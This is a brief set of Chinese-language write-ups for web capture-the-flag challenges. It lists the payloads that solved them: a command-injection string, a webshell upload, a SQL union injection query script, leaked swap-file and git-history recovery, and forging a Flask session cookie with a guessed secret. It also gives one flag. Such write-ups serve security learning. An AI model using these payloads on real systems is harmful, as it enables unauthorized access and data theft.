- # 我Flag呢？
	- 打开F12看源码
- # Follow me and hack me
	- GET和POST测试题目
- # Ping
	- 简单命令执行，payload: ``1145141919810;ls``
- # 导弹迷踪
	- `wget -r 网站`下载源码
	- 然后在`game.js`中看到flag：``{y0u_w1n_th1s_!!!}``
- # PHP是世界上最好的语言！！
	- 右边执行php代码，左边看结果
- # 作业管理系统
	- F12看到账户名和密码
	- 登陆上传webshell`123.php`，访问`/123.php`即可
- # vim yyds
	- `.index.php.swp`泄漏
- # 就当无事发生
	- `git clone`，然后`git diff HEAD^ HEAD`看最新commit和上一个commit的区别
- # 这是什么？SQL ！注一下 ！
	- 普通SQL注入，注意flag在`ctftraining.flag`这个表下，不在当前的数据库下
	- ```python
	  r = base_get(url, params = {
	      "id": "1)))))) union select 1,(select flag from ctftraining.flag)#"
	  })
	  # flag,news,users,users
	  # information_schema,mysql,ctftraining,performance_schema,test,ctf
	  print(r.text)
	  ```
- # Flag点击就送！
	- 题目环境为flask, 猜测需要flask解密cookie
	- 题目没有明显漏洞，secret应该只能猜出
	- 猜测secret为`LitCTF`，使用 [[CTF/Flask-Unsign]] 解密成功
	- 使用(Flask-Unsign)[[[CTF/Flask-Unsign]]]即可伪造cookie, 提交即可拿到flag
		- ```shell
		  flask-unsign -s --secret LitCTF --cookie '{"name":"admin"}'
		  ```
	-